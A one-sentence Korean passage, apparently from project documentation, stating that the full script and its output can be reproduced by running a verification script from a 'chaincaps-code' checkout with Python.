전체 스크립트와 출력은 `docs/chaincaps-verification.py`를 chaincaps-code 체크아웃에서 `PYTHONPATH=. python3`로 실행해 재현할 수 있다.
